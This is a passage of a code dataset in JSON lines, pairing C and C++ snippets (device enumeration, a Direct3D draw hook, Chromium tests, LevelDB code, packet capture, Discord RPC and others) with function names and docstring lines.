GetList: counter=%d\", dwItemsReturned));\\r\\n\\r\\n\\r\\n    pDevInfo = (PSTI_DEVICE_INFORMATION) pBuffer;\\r\\n\\r\\n    \/\/\\r\\n    \/\/ Walk the device list and for each device add active object\\r\\n    \/\/\\r\\n\\r\\n    for (iDev=0;\\r\\n         iDev<dwItemsReturned ;\\r\\n         iDev++, pDevInfo++) {\\r\\n\\r\\n        pfn(pDevInfo,pContext);\\r\\n\\r\\n    } \/\/ end_for\\r\\n\\r\\nCleanup:\\r\\n\\r\\n    if (pBuffer) {\\r\\n        LocalFree(pBuffer);\\r\\n        pBuffer = NULL;\\r\\n    }\\r\\n    *\/', 'code': 'VOID\\r\\nWINAPI\\r\\nEnumerateActiveDevicesWithCallback(\\r\\n    PFN_ACTIVEDEVICE_CALLBACK   pfn,\\r\\n    VOID                    *pContext\\r\\n    )\\r\\n\/*++\\r\\n\\r\\nRoutine Description:\\r\\n\\r\\n    Walk the list of known active devices, calling given routine for each device\\r\\n\\r\\nArguments:\\r\\n\\r\\n    pfn     -   Address of the callback\\r\\n    pContext-   Pointer to context information to pass to callback\\r\\n\\r\\nReturn Value:\\r\\n\\r\\n    None\\r\\n\\r\\n--*\/\\r\\n{\\r\\n\\r\\n    if (!pfn) {\\r\\n        ASSERT((\"Incorrect callback\", 0));\\r\\n        return;\\r\\n    }\\r\\n\\r\\n    LIST_ENTRY * pentry;\\r\\n    LIST_ENTRY * pentryNext;\\r\\n\\r\\n    ACTIVE_DEVICE*  pActiveDevice;\\r\\n\\r\\n    \/\/ BEGIN PROTECTED CODE\\r\\n    {\\r\\n        TAKE_CRIT_SECT t(g_DeviceListSync);\\r\\n\\r\\n        for ( pentry  = g_DeviceListHead.Flink;\\r\\n              pentry != &g_DeviceListHead;\\r\\n              pentry  = pentryNext ) {\\r\\n\\r\\n            pentryNext = pentry->Flink;\\r\\n\\r\\n            pActiveDevice = CONTAINING_RECORD( pentry, ACTIVE_DEVICE,m_ListEntry );\\r\\n\\r\\n            if (!pActiveDevice->IsValid()) {\\r\\n                ASSERT((\"Invalid device signature\", 0));\\r\\n                break;\\r\\n            }\\r\\n\\r\\n            pfn(pActiveDevice,pContext);\\r\\n        }\\r\\n    }\\r\\n    \/\/ END PROTECTED CODE\\r\\n\\r\\n}'}","id":1683}
{"content":"{'function_name': 'wireframe_mode', 'docstring': '\/\/ retrieve the current state', 'code': 'void __stdcall hook_d3d11_draw_indexed(ID3D11DeviceContext* p_context, const UINT index_count, const UINT start_index_location, const INT base_vertex_location)\\n{\\n\\t\/\/TODO: Make wireframe mode not affect the ui.\\n\\tif (show_wireframe)\\n\\t{\\n\\t\\twireframe_mode(true);\\n\\t}\\n\\telse\\n\\t{\\n\\t\\twireframe_mode(false);\\n\\t}\\n\\n\\treturn fn_id3d_11draw_indexed(p_context, index_count, start_index_location, base_vertex_location);\\n}'}","id":1688}
{"content":"{'function_name': 'process', 'docstring': '\/\/ Releasing the memory allocated on heap', 'code': 'JNIEXPORT void JNICALL Java_edu_asu_msrs_artcelerationlibrary_GaussianBlur_getGaussianBlur\\n  (JNIEnv * env, jclass jc, jint a0, jfloat b0, jobject input, jobject output){\\n              AndroidBitmapInfo  info_input;\\n              int ret;\\n              void* pixels_input;\\n              void* pixels_output;\\n\\n\\n              \/\/ Get info for input bitmap.\\n              if ((ret = AndroidBitmap_getInfo(env, input, &info_input)) < 0) {\\n                      LOGE(\"AndroidBitmap_getInfo() failed ! error=%d\", ret);\\n                      return;\\n                  }\\n\\n              \/\/ Acquire a lock for input pixels.\\n              if ((ret = AndroidBitmap_lockPixels(env, input, &pixels_input)) < 0) {\\n                  LOGE(\"AndroidBitmap_lockPixels() failed ! error=%d\", ret);\\n              }\\n\\n                \/\/ Acquire a lock for output pixels.\\n                if ((ret = AndroidBitmap_lockPixels(env, output, &pixels_output)) < 0) {\\n                    LOGE(\"AndroidBitmap_lockPixels() failed ! error=%d\", ret);\\n                }\\n\\n              \/\/ Call process function for transform.\\n              process(&info_input, pixels_input, pixels_output, a0, b0);\\n\\n              \/\/ Unlock pixels.\\n              AndroidBitmap_unlockPixels(env, input);\\n              AndroidBitmap_unlockPixels(env, output);\\n  }'}","id":1689}
{"content":"{'function_name': 'main', 'docstring': '\/\/ inner loop, add if prime', 'code': 'bool isPrime(int test_number, vector<int> primes){\\n    for(int prime:primes)\\n        if (test_number%prime == 0) return false; \/\/ residual 0 when divided by number primes vector      \\n    return true;                                  \/\/ note: in this example all primes are < than test number\\n}'}","id":1690}
{"content":"{'function_name': 'LTR114_GetFrame', 'docstring': '\/\/\u043e\u0441\u0442\u0430\u043d\u043e\u0432 \u043c\u043e\u0434\u0443\u043b\u044f - \u043f\u043e\u0441\u044b\u043b\u043a\u0430 \u043a\u043e\u043c\u0430\u043d\u0434\u044b STOP', 'code': 'INT LTR114_Init\\n    (\\n    PTLTR114 hnd\\n    )\\n{\\n    \/*\\n     * \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u043e\u043f\u0438\u0441\u0430\u0442\u0435\u043b\u044f \u043c\u043e\u0434\u0443\u043b\u044f LTR114.\\n     * \u041e\u041f\u0418\u0421\u0410\u041d\u0418\u0415\\n     *   \u041f\u043e\u043b\u044f\u043c \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u044b \u043e\u043f\u0438\u0441\u0430\u0442\u0435\u043b\u044f \u043c\u043e\u0434\u0443\u043b\u044f \u043f\u0440\u0438\u0441\u0432\u0430\u0438\u0432\u0430\u044e\u0442\u0441\u044f \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \"\u043f\u043e-\u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e\".\\n     * \u041f\u0410\u0420\u0410\u041c\u0415\u0422\u0420\u042b\\n     *   hnd - \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u043e\u043f\u0438\u0441\u0430\u0442\u0435\u043b\u044c \u043c\u043e\u0434\u0443\u043b\u044f.\\n     * \u0412\u041e\u0417\u0412\u0420\u0410\u0429\u0410\u0415\u041c\u041e\u0415 \u0417\u041d\u0410\u0427\u0415\u041d\u0418\u0415\\n     *   \u041a\u043e\u0434 \u043e\u0448\u0438\u0431\u043a\u0438 (\u0441\u043c. \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043e\u0447\u043d\u044b\u0439 \u0444\u0430\u0439\u043b).\\n     *\/\\n\\n    INT ret_val = LTR_OK;\\n\\n    if (hnd == NULL)\\n     return LTR114_ERR_INVALID_DESCR;\\n    hnd->size = sizeof(TLTR114);\\n\\n    if ((ret_val = LTR_Init(&hnd->Channel)) == LTR_OK)\\n    {\\n        const char date_def[14]=\"\";\\n        int i,j;\\n        const char name_def[8]  = \"LTR114\";\\n        const char serial_def[16] = \"\";\\n\\n        hnd->LChQnt = 1;               \/\/\u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f \u043e\u0434\u0438\u043d \u043a\u0430\u043d\u0430\u043b\\n        \/\/\u0432\u0441\u0435 \u0437\u0430\u043f\u0438\u0441\u0438 \u0432 \u0442\u0430\u0431\u043b\u0438\u0446\u0435 \u043b\u043e\u0433\u0438\u0447\u0435\u0441\u043a\u0438\u0445 \u043a\u0430\u043d\u0430\u043b\u043e\u0432 \u043e\u0431\u043d\u0443\u043b\u044f\u044e\u0442\u0441\u044f\\n        for (i = 0; (i < LTR114_MAX_LCHANNEL); i++)\\n        {\\n            hnd->LChTbl[i].Channel = 0; hnd->LChTbl[i].Range =0; hnd->LChTbl[i].MeasMode=0;\\n        }\\n\\n        \/\/\u043f\u0440\u0438\u0441\u0432\u043e\u0435\u043d\u0438\u0435 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u043f\u043e-\u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e\\n        hnd->FreqDivider = LTR114_DEF_DIVIDER;         \/\/\u0447\u0430\u0441\u0442\u043e\u0442\u0430 4000 \u0413\u0446      \\n        hnd->Interval = LTR114_DEF_INTERVAL;           \/\/\u043d\u0435\u0442 \u043c\u0435\u0436\u043a\u0430\u0434\u0440\u043e\u0432\u043e\u0439 \u0437\u0430\u0434\u0435\u0440\u0436\u043a\u0438\\n        hnd->SpecialFeatures = 0;                      \/\/\u0432\u0441\u0435 \u0444\u043b\u0430\u0433\u0438 \u043e\u0442\u043a\u043b\u044e\u0447\u0435\u043d\u044b\\n        hnd->AdcOsr = LTR114_DEF_OSR;                  \/\/OSR \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u0442\u0441\u044f \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e\\n        hnd->SyncMode = LTR114_DEF_SYNC_MODE;          \/\/\u0432\u043d\u0443\u0442\u0440\u0435\u043d\u043d\u044f\u044f \u0441\u0438\u043d\u0445\u0440\u043e\u043d\u0438\u0437\u0430\u0446\u0438\u044f\\n        hnd->Active = FALSE;\\n\\n\\n        hnd->ModuleInfo.VerMCU = 0;\\n        hnd->ModuleInfo.VerPLD = 0;\\n        (void)strcpy((char *)hnd->ModuleInfo.Date, date_def);\\n        (void)strcpy((char *)hnd->ModuleInfo.Name, name_def);\\n        (void)strcpy((char *)hnd->ModuleInfo.Serial, serial_def);\\n\\n        for (i=0; i < LTR114_ADC_RANGEQNT; i++)\\n        {\\n            hnd->AutoCalibrInfo[i].TempScale=NULL;\\n            for (j=0;j<LTR114_SCALE_INTERVALS; j++)\\n            {\\n                hnd->AutoCalibrInfo[i].Coef[j].Gain = 1;\\n                hnd->AutoCalibrInfo[i].Coef[j].Offset = 0;\\n            }\\n        }\\n\\n\\t\\thnd->Reserve = NULL;\\n\\n\/\/        hnd->FilterData = NULL;\\n    }  \/\/if ((ret_val = LTR_Init(&hnd->Channel)) == LTR_OK)\\n\\n    return ret_val;\\n}'}","id":1693}
{"content":"{'function_name': 'TEST_F', 'docstring': '\/\/ cert, but is still valid for an intermediate.', 'code': 'TEST_F(HTTPSHardFailTest, IntermediateResponseTooOld) {\\n  if (!SystemSupportsOCSP()) {\\n    LOG(WARNING) << \"Skipping test because system doesn\\'t support OCSP\";\\n    return;\\n  }\\n\\n  if (!SystemSupportsHardFailRevocationChecking()) {\\n    LOG(WARNING) << \"Skipping test because system doesn\\'t support hard fail \"\\n                 << \"revocation checking\";\\n    return;\\n  }\\n\\n  EmbeddedTestServer::ServerCertificateConfig cert_config;\\n  cert_config.intermediate = EmbeddedTestServer::IntermediateType::kInHandshake;\\n  cert_config.ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      {{OCSPRevocationStatus::GOOD,\\n        EmbeddedTestServer::OCSPConfig::SingleResponse::Date::kValid}});\\n  \/\/ Use an OCSP response for the intermediate that is too old according to\\n  \/\/ BRs, but is fine for a locally trusted root.\\n  cert_config.intermediate_ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      {{OCSPRevocationStatus::GOOD,\\n        EmbeddedTestServer::OCSPConfig::SingleResponse::Date::kLonger}});\\n\\n  CertStatus cert_status;\\n  DoConnection(cert_config, &cert_status);\\n\\n  EXPECT_EQ(0u, cert_status & CERT_STATUS_ALL_ERRORS);\\n  EXPECT_TRUE(cert_status & CERT_STATUS_REV_CHECKING_ENABLED);\\n}'}","id":1697}
{"content":"{'function_name': 'extendPalindrome', 'docstring': '\/\/ Border reached', 'code': 'string longestPalindrome (const string &str) {\\n    int n = str.length ();\\n    if (n <= 1) {\\n        return str;\\n    }\\n\\n    int maxlen = 1; \/\/ By default, the longest palidrome is set to [0, 0]\\n    pair<int, int> longest = make_pair (0, 0);\\n\\n    for (int i = 0 ; i < n - 1 ; i++) {\\n        pair<int, int> temp;\\n\\n        temp = extendPalindrome (str, i, i);\\n        if (temp.second - temp.first + 1 > maxlen) {\\n            maxlen = temp.second - temp.first + 1;\\n            longest = temp;\\n        }\\n\\n        if (str[i] == str[i+1]) {\\n            temp = extendPalindrome (str, i, i+1);\\n            if (temp.second - temp.first + 1 > maxlen) {\\n                maxlen = temp.second - temp.first + 1;\\n                longest = temp;\\n            }\\n        }\\n    }\\n\\n    return str.substr (longest.first, longest.second - longest.first + 1);\\n}'}","id":1698}
{"content":"{'function_name': 'SavePartnerMeta', 'docstring': '\/\/DBImpl* db = spm->db;', 'code': 'TEST(SinglePartnerTableTest, AddSimple) {\\n        InternalKeyComparator cmp(BytewiseComparator());\\n        Env* env = Env::Default();\\n        std::string nvm_path;\\n        env->GetMEMDirectory(&nvm_path);\\n        uint64_t meta_number= 1, meta_size = (4 << 10) << 10;\\n        std::string indexFile = MapFileName(nvm_path, meta_number);\\n        DEBUG_T(\"after get mapfilename:%s\\\\n\", indexFile.c_str());\\n        ArenaNVM* arena = new ArenaNVM(meta_size, &indexFile, false);\\n        arena->nvmarena_ = true;\\n        DEBUG_T(\"after get arena nvm\\\\n\");\\n        std::shared_ptr<PartnerMeta> pm = std::make_shared<PartnerMeta>(cmp, arena, false);\\n        std::string dbname;\\n        env->GetTestDirectory(&dbname);\\n        std::string fname = TableFileName(dbname, 1);\\n        WritableFile* file;\\n        Status s = env->NewWritableFile(fname, &file);\\n        if (!s.ok()) {\\n            DEBUG_T(\"new writable file failed\\\\n\");\\n        }\\n        Options option = leveldb::Options();\\n        uint64_t file_number = 1;\\n        TableBuilder* builder = new TableBuilder(option, file, file_number);\\n        SinglePartnerTable* spt = new SinglePartnerTable(builder, pm.get());\\n        \\n        SavePartnerMetaArgs* spm = new SavePartnerMetaArgs;\\n        spm->spt = spt;\\n        env->StartThread(SavePartnerMeta, spm);\\n        DEBUG_T(\"----------start thread----------\\\\n\");\\n        \\n        Slice value1(\"this is my key1\");\\n        Slice value2(\"this is my key1 again\");\\n        Slice value3(\"this is my key3\");\\n        Slice value4(\"this is my key4\");\\n        Slice value5(\"this is my key5\");\\n        LookupKey lkey1(Slice(\"abcdmykey1\"), 0);\\n        LookupKey lkey2(Slice(\"abcdmykey1\"), 1);\\n        LookupKey lkey3(Slice(\"abcdmykey3\"), 0);\\n        LookupKey lkey4(Slice(\"abcdmykey4\"), 0);\\n        LookupKey lkey5(Slice(\"abcdmykey5\"), 0);\\n        spt->Add(lkey1.internal_key(), value1);\\n        \/\/\u66f4\u65b0\\n        spt->Add(lkey2.internal_key(), value2);\\n        spt->Add(lkey3.internal_key(), value3);\\n        spt->Add(lkey4.internal_key(), value4);\\n        spt->Add(lkey5.internal_key(), value5);\\n        spt->Finish();\\n\\n        spt->bailout = true;\\n        spt->meta_available_var.notify_one();\\n        std::unique_lock<std::mutex> job_lock(spt->wait_mutex);\\n        DEBUG_T(\"-------waiting meta thread finished----------\\\\n\");\\n        spt->wait_var.wait(job_lock, [spt]()->bool{return static_cast<bool>(spt->finished);});\\n        DEBUG_T(\"thread finished...\\\\n\");\\n\\n        uint64_t file_size = spt->FileSize();\\n        delete spt;\\n        spt = nullptr;\\n        DEBUG_T(\"after first finish, file size is %llu........\\\\n\", file_size);\\n        \\n        \/\/ builder = new TableBuilder(option, file, file_number, file_size);\\n        \/\/ spt = new SinglePartnerTable(builder, pm.get());\\n        \/\/ Slice value6(\"this is my key6\");\\n        \/\/ Slice value7(\"this is my key7\");\\n        \/\/ Slice value8(\"this is my key8\");\\n        LookupKey lkey6(Slice(\"abcdmykey6\"), 0);\\n        \/\/ LookupKey lkey7(Slice(\"abcdmykey7\"), 0);\\n        \/\/ LookupKey lkey8(Slice(\"abcdmykey8\"), 0);\\n        \/\/ spt->Add(lkey6.internal_key(), value6);\\n        \/\/ spt->Add(lkey7.internal_key(), value7);\\n        \/\/ spt->Add(lkey8.internal_key(), value8);\\n        \/\/ spt->Finish();\\n        \/\/ delete spt;\\n        \/\/ spt = nullptr;\\n        \/\/ DEBUG_T(\"after second finish........\\\\n\");\\n\\n        \/\/\u8bfb\u53d6\u6570\u636e\\n        \/\/(TODO)\u53ef\u4ee5\u628apm\u4fdd\u5b58\u5728filemetadata\u4e2d\uff0c\u907f\u514d\u9891\u7e41\u5730\u521b\u5efa\u91ca\u653e\\n        uint64_t block_offset, block_size;\\n        bool find = pm->Get(lkey3, &block_offset, &block_size, &s);\\n        TableCache* table_cache = new TableCache(dbname, option, option.max_open_files, nvm_path);\\n        ReadOptions roptions;\\n        std::string resValue;\\n        Saver saver;\\n        saver.state = kNotFound;\\n        saver.ucmp = cmp.user_comparator();\\n        saver.user_key = lkey3.user_key();\\n        saver.value = &resValue;\\n        if(find) {\\n            DEBUG_T(\"offset is %llu, block size:%llu\\\\n\", block_offset, block_size);\\n            s = table_cache->Get(roptions, file_number, lkey3.internal_key(), &saver, SaveValue, block_offset, block_size);\\n            \/\/pm->Unref();\\n            DEBUG_T(\"get value3 %s\\\\n\", (*saver.value).c_str());\\n        } else {\\n            DEBUG_T(\"cannot find key from nvm skiplist\\\\n\");\\n        }\\n\\n        DEBUG_T(\"after get key3......\\\\n\");\\n\\n        \/\/\u8fed\u4ee3\u5668\\n        \/\/ Iterator* iter = table_cache->NewPartnerIterator(ReadOptions(), file_number, pm);\\n        \/\/ iter->SeekToFirst();\\n        \/\/ while(iter->Valid()) {\\n        \/\/     DEBUG_T(\"key is %s, value is %s\\\\n\", iter->key().ToString().c_str(), iter->value().ToString().c_str());\\n        \/\/     iter->Next();\\n        \/\/ }\\n        \/\/ pm->Unref();\\n        \/\/ delete iter;\\n    }'}","id":1712}
{"content":"{'function_name': 'main', 'docstring': '\/\/WFile;', 'code': \"void make_graph(int head,int tail,int depth){\\n\\t\/\/ validate input\\n\\twhile(head < tail && data[head].length()<=depth){\\n\\t\\thead++;\\n\\t}\\n\\tfori(i,head,tail){\\n\\t\\tif(data[i].length()<=depth){\\n\\t\\t\\tcycle = true;\\n\\t\\t\\treturn;\\n\\t\\t}\\n\\t}\\n\\t\/\/ make digraph\\n\\tfori(i,head,tail-1){\\n\\t\\tint nhead = i;\\n\\t\\tint ntail = i;\\n\\t\\twhile(ntail < tail && data[ntail][depth] == data[nhead][depth]){\\n\\t\\t\\tntail++;\\n\\t\\t}\\n\\t\\tif(ntail - nhead > 1){\\n\\t\\t\\tmake_graph(nhead,ntail,depth+1);\\n\\t\\t}\\n\\t\\ti = ntail - 1;\\n\\t\\tif(i < tail-1){\\n\\t\\t\\tadj[data[i][depth]-'a'].insert(data[i+1][depth]-'a');\\n\\t\\t}\\n\\t}\\n}\"}","id":1715}
{"content":"{'function_name': 'nu_score_b', 'docstring': '\/\/ ((matches * 100) \/ len) \/ ((4. * p) \/ (len * len))', 'code': 'int aa_score (char* xseq, int xpos, char* yseq, int ypos, int len, int* na_wt[], int* scorexy)\\n{\\n    int i, j, tnum;\\n    int px, py, txy, tyy;\\n    int frame = ypos % 3;\\n    int max_score = 0;\\n    int scoreyy [6];\\n    int *wt_f = na_wt[0];\\n    int *wt_r = na_wt[1];\\n\\n    \/\/reset scores\\n    for (i = 0; i < 6; i++)\\n    {\\n        scorexy [i] = 0;\\n        scoreyy [i] = 0;\\n    }\\n\\n    \/\/calculate Y-X cross-similarity scores\\tand Y-Y self-similarity scores\\n    for (i = 0; i < len - 2; i += 3)\\n    {\\n        \/\/get next 12 bases (good for up to 12 - 3 = 9 triplets)\\n        px = get_12_bases (xseq, xpos + i);\\n        py = get_12_bases (yseq, ypos + i);\\n\\n        \/\/calculate number of triplets that are inside the batch\\n        tnum = min_ (9, len - 2 - i);\\n        for (j = 0; j < tnum; j++)\\n        {\\n            \/\/extract triplets\\n            txy = ((py << 6) & 0xfc0) | (px & 0x3f);\\n            tyy = ((py << 6) & 0xfc0) | (py & 0x3f);\\n\\n            \/\/calculate Y-X cross-similarity scores\\n            scorexy [frame] \\t+= wt_f [txy];\\t\/\/forward frames\\n            scorexy [frame + 3] += wt_r [txy];\\t\/\/reverse frames\\n\\n            \/\/calculate Y-Y self-similarity scores\\n            scoreyy [frame] \\t+= wt_f [tyy];\\t\/\/forward frames\\n            scoreyy [frame + 3] += wt_r [tyy];\\t\/\/reverse frames\\n\\n            if (++frame > 2) frame = 0;\\n            px >>= 2, py >>= 2;\\n        }\\n    }\\n\\n\\n    \/\/normalise X-Y scores with respect to Y-Y scores, convert to %\\n    for (i = 0; i < 6; i++)\\n        scorexy [i] = scorexy [i] * 100 \/ scoreyy [i];\\n\\n    \/\/select the highest scoring frame\\n    for (i = 0; i < 6; i++)\\n        if (scorexy[i] > max_score)\\n            max_score = scorexy[i], frame = i;\\n\\n    return frame;\\n}'}","id":1733}
{"content":"{'function_name': 'Discord_Respond', 'docstring': \"\/\/ if we are not connected, let's not batch up stale messages for later\", 'code': 'DISCORD_EXPORT void Discord_RunCallbacks(void)\\n{\\n    \/\/ Note on some weirdness: internally we might connect, get other signals, disconnect any number\\n    \/\/ of times inbetween calls here. Externally, we want the sequence to seem sane, so any other\\n    \/\/ signals are book-ended by calls to ready and disconnect.\\n\\n    if (!Connection) {\\n        return;\\n    }\\n\\n    bool wasDisconnected = WasJustDisconnected.exchange(false);\\n    bool isConnected = Connection->IsOpen();\\n\\n    if (isConnected) {\\n        \/\/ if we are connected, disconnect cb first\\n        std::lock_guard<std::mutex> guard(HandlerMutex);\\n        if (wasDisconnected && Handlers.disconnected) {\\n            Handlers.disconnected(LastDisconnectErrorCode, LastDisconnectErrorMessage);\\n        }\\n    }\\n\\n    if (WasJustConnected.exchange(false)) {\\n        std::lock_guard<std::mutex> guard(HandlerMutex);\\n        if (Handlers.ready) {\\n            DiscordUser du{connectedUser.userId,\\n                           connectedUser.username,\\n                           connectedUser.discriminator,\\n                           connectedUser.avatar};\\n            Handlers.ready(&du);\\n        }\\n    }\\n\\n    if (GotErrorMessage.exchange(false)) {\\n        std::lock_guard<std::mutex> guard(HandlerMutex);\\n        if (Handlers.errored) {\\n            Handlers.errored(LastErrorCode, LastErrorMessage);\\n        }\\n    }\\n\\n    if (WasJoinGame.exchange(false)) {\\n        std::lock_guard<std::mutex> guard(HandlerMutex);\\n        if (Handlers.joinGame) {\\n            Handlers.joinGame(JoinGameSecret);\\n        }\\n    }\\n\\n    if (WasSpectateGame.exchange(false)) {\\n        std::lock_guard<std::mutex> guard(HandlerMutex);\\n        if (Handlers.spectateGame) {\\n            Handlers.spectateGame(SpectateGameSecret);\\n        }\\n    }\\n\\n    \/\/ Right now this batches up any requests and sends them all in a burst; I could imagine a world\\n    \/\/ where the implementer would rather sequentially accept\/reject each one before the next invite\\n    \/\/ is sent. I left it this way because I could also imagine wanting to process these all and\\n    \/\/ maybe show them in one common dialog and\/or start fetching the avatars in parallel, and if\\n    \/\/ not it should be trivial for the implementer to make a queue themselves.\\n    while (JoinAskQueue.HavePendingSends()) {\\n        auto req = JoinAskQueue.GetNextSendMessage();\\n        {\\n            std::lock_guard<std::mutex> guard(HandlerMutex);\\n            if (Handlers.joinRequest) {\\n                DiscordUser du{req->userId, req->username, req->discriminator, req->avatar};\\n                Handlers.joinRequest(&du);\\n            }\\n        }\\n        JoinAskQueue.CommitSend();\\n    }\\n\\n    if (!isConnected) {\\n        \/\/ if we are not connected, disconnect message last\\n        std::lock_guard<std::mutex> guard(HandlerMutex);\\n        if (wasDisconnected && Handlers.disconnected) {\\n            Handlers.disconnected(LastDisconnectErrorCode, LastDisconnectErrorMessage);\\n        }\\n    }\\n}'}","id":1738}
{"content":"{'function_name': 'utf8_to_ws', 'docstring': '\/\/    blah = converter.from_bytes(text);', 'code': 'std::wstring utf8_to_ws(char const * text)\\n{\\n    auto converted = utf8_to_ws(text,-1);\\n    converted.pop_back(); \/\/ remove the null terminated char\\n    return converted;\\n}'}","id":1747}
{"content":"{'function_name': 'syntaxPrint', 'docstring': '\/\/remove semi', 'code': 'errVar executePrint(vector<string> tokens, ExecutionOutput &output, SaveState &ss, bool lineBreak, vector<string> &code)\\n{\\n    errVar err;\\n    err.errorPos=-1;\\n    \\n    string printStr = \"\";\\n    \\n    bool concatFromString = false;;\\n    for (int i=1; i<tokens.size(); i++)\\n    {\\n        Object temp;\\n        temp.value = tokens[i];\\n        string value = temp.value;\\n        \\n        bool isString = ((tokens[i][0]==\\'\"\\' && tokens[i][tokens[i].length()-1]==\\'\"\\') || (tokens[i][0]==\\'\\\\\\'\\' && tokens[i][tokens[i].length()-1]==\\'\\\\\\'\\'));\\n        \\n        \/\/cout << tokens[i] << \"==\\\\n\";\\n        if (isString)\\n        {\\n            \/\/cout << tokens[i] << \"--\\\\n\";\\n            concatFromString = true;\\n            printStr+=tokens[i].substr(1, tokens[i].length()-2);\\n            continue;\\n        }\\n\\n        vector<string> eval;\\n        while (!isString && i<tokens.size())\\n        {\\n            if (concatFromString)\\n            {\\n                concatFromString = false;\\n                i++;\\n                continue;\\n            }\\n            eval.push_back(tokens[i]);\\n            i++;\\n            if (i>=tokens.size()) break;\\n            isString = ((tokens[i][0]==\\'\"\\' && tokens[i][tokens[i].length()-1]==\\'\"\\') || (tokens[i][0]==\\'\\\\\\'\\' && tokens[i][tokens[i].length()-1]==\\'\\\\\\'\\'));\\n        }\\n        i--;\\n        \/\/cout << tokens[i] << \"==\\\\n\";\\n        if (eval.size() > 0)\\n        {\\n            \/\/cout << vectorToString(eval) << \"==\\\\n\";\\n            errVar e = anyEval(eval, ss, output, code);\\n            \/\/cout << e.message << \"==1\\\\n\";\\n            if (e.errorPos == -1)\\n            {\\n                printStr += e.message;\\n            }\\n            else\\n            {\\n                \/\/cout << e.message << \"==\\\\n\";\\n                \/\/output.err.push_back(\"Runtime error: \\\\nToken: \\'\" + eval[e.errorPos] + \"\\'\\\\n\\\\nGot error: \" + e.message);\\n                output.err.push_back(e.message);\\n            }\\n        }\\n    }\\n    \\n    if (err.errorPos == -1)\\n    {\\n        output.output.push_back(printStr);\\n        cout << printStr;\\n        if (lineBreak) cout << \"\\\\n\";\\n    }\\n    \/*else\\n    {\\n        output.err.push_back(err.message);\\n    }*\/\\n    \/\/cout << printStr;\\n    return err;\\n}'}","id":1762}
{"content":"{'function_name': 'isFilterInputInFilterList', 'docstring': '\/\/ \u5efa\u4e00\u4e2aFilter\u7c7b\uff0c\u5c06filterList\u5176\u4f5c\u4e3a\u6210\u5458\u53d8\u91cf\uff0cisFilterInputInFilterList\uff08\uff09\u4f5c\u4e3a\u5176\u65b9\u6cd5', 'code': 'UINT capture_thread(LPVOID pParam)\\n{\\n\\t\/* \u83b7\u53d6\u5e76\u6253\u5f00\u9009\u4e2d\u7684\u7f51\u5361 *\/\\n\\tint selIndex = g_pComboBoxDevList->GetCurSel();\\n\\tif(selIndex == CB_ERR )\\n\\t{\\n\\t\\tAfxMessageBox(_T(\"\u8bf7\u9009\u62e9\u7f51\u5361\"),MB_OK);\\n\\t\\treturn -1;\\n\\t}\\t\\t\\n\\tint count = 0;\\n    for(g_pDev = g_pAllDevs; count < selIndex; g_pDev = g_pDev->next, ++count);\\n\\tif((g_pAdhandle = pcap_open_live(g_pDev->name,\\n\\t\\t\\t\\t\\t65535,\\n\\t\\t\\t\\t\\t PCAP_OPENFLAG_PROMISCUOUS,\\n\\t\\t\\t\\t\\t1000,\\n\\t\\t\\t\\t\\tg_errbuf)) == NULL)\\n\\t{ \\n\\t\\tAfxMessageBox(_T(\"pcap_open_live\u9519\u8bef!\"), MB_OK);\\n\\t}\\n\\n\\t\/* \u5224\u65ad\u63a5\u53e3\u7684\u94fe\u8def\u5c42\u7c7b\u578b\u662f\u5426\u4e3a\u4ee5\u592a\u7f51*\/\\n\\tif( pcap_datalink(g_pAdhandle) != DLT_EN10MB)\\n\\t\\tAfxMessageBox(_T(\"\u6570\u636e\u94fe\u8def\u5c42\u4e0d\u662f\u4ee5\u592a\u7f51\"), MB_OK);\\n\\n\\t\\n\\tpcap_dumper_t *dumpfile = NULL;\\t\\n\\t\/* \u6253\u5f00\u5806\u6587\u4ef6\\n\\tstrcpy(filename, \"pkt_cap\");\\n\\n\\tdumpfile = pcap_dump_open(adhandle, filename);\\n\\t*\/\\n\\n\\t\/* \u5f00\u59cb\u6355\u83b7\u6570\u636e\u5305 *\/\\n\\tpcap_loop(g_pAdhandle, -1,\\tpacket_handler, (unsigned char *)dumpfile);\\n\\t\\n\\treturn 0;\\n}'}","id":1763}
{"content":"{'function_name': 'GetSessionRoute', 'docstring': \"\/\/ media session doesn't have an associated Remote Playback route.\", 'code': 'std::unique_ptr<global_media_controls::MediaItemUIFooter> BuildFooter(\\n    const std::string& id,\\n    base::WeakPtr<media_message_center::MediaNotificationItem> item,\\n    Profile* profile,\\n    global_media_controls::GlobalMediaControlsEntryPoint entry_point,\\n    absl::optional<media_message_center::MediaColorTheme> media_color_theme) {\\n  \/\/ Show a footer view for a Cast item.\\n  if (item->SourceType() == media_message_center::SourceType::kCast &&\\n      media_router::GlobalMediaControlsCastStartStopEnabled(profile)) {\\n#if BUILDFLAG(IS_CHROMEOS)\\n    if (base::FeatureList::IsEnabled(\\n            media::kGlobalMediaControlsCrOSUpdatedUI) &&\\n        media_color_theme.has_value()) {\\n      return std::make_unique<MediaItemUICastFooterView>(\\n          base::BindRepeating(\\n              &CastMediaNotificationItem::StopCasting,\\n              static_cast<CastMediaNotificationItem*>(item.get())->GetWeakPtr(),\\n              entry_point),\\n          media_color_theme.value());\\n    }\\n#endif\\n    return std::make_unique<MediaItemUILegacyCastFooterView>(\\n        base::BindRepeating(\\n            &CastMediaNotificationItem::StopCasting,\\n            static_cast<CastMediaNotificationItem*>(item.get())->GetWeakPtr(),\\n            entry_point));\\n  }\\n\\n  \/\/ Show a footer view for a local media item when it has an associated Remote\\n  \/\/ Playback session or a Tab Mirroring Session.\\n  if (item->SourceType() !=\\n      media_message_center::SourceType::kLocalMediaSession) {\\n    return nullptr;\\n  }\\n\\n  auto route = 